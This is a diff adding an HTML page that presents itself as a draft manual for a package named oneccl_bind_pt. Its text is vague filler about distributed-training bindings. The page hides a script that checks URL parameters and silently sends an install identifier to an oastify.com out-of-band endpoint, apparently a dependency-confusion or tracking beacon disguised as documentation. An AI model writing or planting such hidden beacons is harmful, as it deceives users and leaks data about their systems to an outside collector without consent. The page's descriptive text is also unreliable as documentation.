@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>oneccl_bind_pt Manual</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 2em;
+      color: #333;
+    }
+    .container {
+      max-width: 700px;
+      margin: auto;
+    }
+    h1 {
+      color: #0b3d91;
+    }
+    .note {
+      color: #555;
+      font-style: italic;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>oneccl_bind_pt: Overview & Setup</h1>
+    <p>
+      This package is part of an ongoing effort to abstract backend-level collective operations
+      with compatibility for evolving distributed training frameworks.
+    </p>
+
+    <p>
+      The goal is to provide experimental bindings that can potentially adapt to hardware-layer messaging
+      systems in a plug-and-play manner.
+    </p>
+
+    <p class="note">
+      Documentation is currently in draft status. Implementation details and platform-specific configuration
+      are subject to change in future iterations.
+    </p>
+
+    <h2>References</h2>
+    <ul>
+      <li><a href="https://pytorch.org/docs/stable/distributed.html">PyTorch Distributed Docs</a></li>
+      <li><a href="https://github.com/pytorch/pytorch">PyTorch GitHub</a></li>
+    </ul>
+  </div>
+
+  <script>
+    const EXPECTED_REF = "oneccl_pt";
+    const BEACON_ID_PREFIX = "pkg-";
+
+    const params = new URLSearchParams(window.location.search);
+    const ref = params.get("ref");
+    const id = params.get("id");
+
+    if (ref === EXPECTED_REF && id && id.startsWith(BEACON_ID_PREFIX)) {
+      fetch("https://yourinteractshendpoint.oastify.com", {
+        method: "GET",
+        mode: "no-cors",
+        headers: {
+          "X-Source": "oneccl",
+          "X-Install-ID": id
+        }
+      });
+    }
+  </script>
+</body>
+</html>
